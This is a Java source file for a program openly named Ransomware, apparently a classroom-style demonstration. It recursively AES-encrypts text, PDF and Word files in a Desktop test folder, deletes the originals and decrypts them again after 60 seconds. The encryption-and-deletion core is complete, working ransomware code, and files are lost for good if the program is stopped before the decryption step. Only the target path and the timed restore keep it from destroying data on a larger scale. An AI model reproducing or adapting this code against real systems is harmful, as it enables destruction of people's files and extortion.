package ransomware;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class Ransomware {
	
	// In milliseconds, how long to wait before things are decrypted.
	private static final int DECRYPTION_DELAY = 60000;
	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
	private static final String EXTENSION = ".RANSOM";

	private static List<String> targetedExtensions = new ArrayList<String>();
	private static Cipher cipherEncypt = null, cipherDecrypt = null;
	
	public static void main(String [] args) {
		
		final String[] ext = {"txt", "pdf", "docx"};
		for(String s: ext) {
			targetedExtensions.add(s);
		}
		
		try {
			cipherEncypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
			cipherDecrypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
		} catch (NoSuchAlgorithmException | NoSuchPaddingException e1) {
			e1.printStackTrace();
		}finally {
			if(cipherEncypt == null || cipherDecrypt == null) {
				System.out.println("Could not create cipher instances.");
				System.exit(0);
			}
		}
		
		List<File> results = new ArrayList<File>();
		getAllFiles(TARGET_DIR, results);
		
		// Generate a secure 256 bit symmetric key for AES to use
		SecretKey key = null;
		try {
			key = generateAESKey();
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}finally{
			if(key == null) {
				System.out.println("Could not create an encryption key.");
				System.exit(0);
			}
		}
		
		// Initialize the ciphers
		try {
			SecureRandom randomSecureRandom = new SecureRandom();
			byte[] iv = new byte[cipherEncypt.getBlockSize()];
			randomSecureRandom.nextBytes(iv);
			IvParameterSpec ivParams = new IvParameterSpec(iv);
			
			cipherEncypt.init(Cipher.ENCRYPT_MODE, key, ivParams);
			cipherDecrypt.init(Cipher.DECRYPT_MODE, key, ivParams);
		} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
			System.out.println("Could not init cipher, invalid key.");
			e.printStackTrace();
			System.exit(0);
		}
		
		/* Loop through each file, get its data, encrypt it,
		*  and then create a new file with the encrypted data.
		*/
		for(File file: results) {
			
			/* Check to see if the file extension is
			* in the allowed list.
			*/
			String extension = getFileExtension(file.getName());
			if(!targetedExtensions.contains(extension)) {
				continue;
			}
			
			/*
			 * Get the file data as a byte array and
			 * then create an encrypted file from it.
			 */
			byte[] data = getFileData(file);
			if(data != null) {
				byte[] encryptedData = encryptData(data);
				File emptyEncryptedFile = makeEmptyFile(file, true);
				addEncryptedData(emptyEncryptedFile, encryptedData);
			}
		}
		
		/*
		 * Delete the original, non encrypted files.
		 */
		for(File file: results) {
			String extension = getFileExtension(file.getName());
			if(targetedExtensions.contains(extension)) {
				file.delete();
			}
		}
		
		//Wait 60 seconds before decrypting
		System.out.println("Finished encryption. Decrypting files in 60 seconds...");
		System.out.println("Do not exit this program or the files will be forever lost.");
		try {
			Thread.sleep(DECRYPTION_DELAY);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		results.clear();
		getAllFiles(TARGET_DIR, results);
		
		System.out.println("Decrypting your files...");
		/* Loop through each file, get its data, decrypt it,
		*  and then create a new file with the decrypted data.
		*/
		for(File file: results) {
			// Only decrypt files with extension of EXTENSION
			String extension = getFileExtension(file.getName());
			if(!extension.equals(EXTENSION.substring(1, EXTENSION.length()))) {
				continue;
			}
			
			byte[] data = getFileData(file);
			
			if(data != null) {
				byte[] decryptedData = decryptData(data);
				File emptydecryptedFile = makeEmptyFile(file, false);
				addEncryptedData(emptydecryptedFile, decryptedData);
			}
		}
		
		System.out.println("Deleting .RANSOM files.");
		for(File file: results) {
			String extension = getFileExtension(file.getName());
			if(extension.equals(EXTENSION.substring(1, EXTENSION.length()))) {
				file.delete();
			}
		}
	}


	private static String getFileExtension(String fileName) {
		int i = fileName.lastIndexOf('.');
		int length = fileName.length();
		return fileName.substring(i+1, length);
	}
	
	
	private static SecretKey generateAESKey() throws NoSuchAlgorithmException {
		KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
		SecureRandom secureRandom = new SecureRandom();
		int keyBitSize = 256;
		keyGenerator.init(keyBitSize, secureRandom);
		return keyGenerator.generateKey();		
	}


	private static byte[] getFileData(File file) {
		String p = file.getAbsolutePath();
		Path path = Paths.get(p);
		try {
			byte[] data = Files.readAllBytes(path);
			return data;
		} catch (IOException e) {
			System.out.println("Could not read file: " + file.getName());
			return null;
		}
	}
	
	
	private static byte[] encryptData(byte[] data) {
		byte[] encryptedData = null;
		try {
			encryptedData = cipherEncypt.doFinal(data);
		} catch (IllegalBlockSizeException | BadPaddingException e) {
			System.out.println("Could not encrypt data.");
			e.printStackTrace();
			System.exit(0);
		}
		
		return encryptedData;
	}


	private static byte[] decryptData(byte[] encryptedData) {
		byte[] data = null;
		try {
			data = cipherDecrypt.doFinal(encryptedData);
		} catch (IllegalBlockSizeException | BadPaddingException e) {
			System.out.println("Could not encrypt data.");
			e.printStackTrace();
			System.exit(0);
		}
		
		return data;
	}
	
	
	private static File makeEmptyFile(File file, boolean encryptMode) {
		File newFile;
		if(encryptMode) {
			newFile = new File(file.getAbsolutePath() + EXTENSION);
		}else {
			int lengthName = file.getAbsolutePath().length();
			int lengthExt = EXTENSION.length();
			String originalFileName = file.getAbsolutePath().substring(0, lengthName - lengthExt);
			newFile = new File(originalFileName);
		}

		try {
			newFile.createNewFile();
		} catch (IOException e) {
			e.printStackTrace();
		}	
		
		return newFile;
	}
	
	private static void getAllFiles(String directoryName, List<File> files) {
	    File directory = new File(directoryName);

	    File[] fList = directory.listFiles();
	    if(fList != null) {
	        for (File file : fList) {      
	            if (file.isFile()) {
	                files.add(file);
	            } else if (file.isDirectory()) {
	            	getAllFiles(file.getAbsolutePath(), files);
	            }
	        }
	    }
	}
	
	
	private static void addEncryptedData(File encryptedFile, byte[] encryptedData) {
		String path = encryptedFile.getAbsolutePath();
		try (FileOutputStream stream = new FileOutputStream(path)) {
		    try {
				stream.write(encryptedData);
			} catch (IOException e) {
				e.printStackTrace();
			}
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	}
}
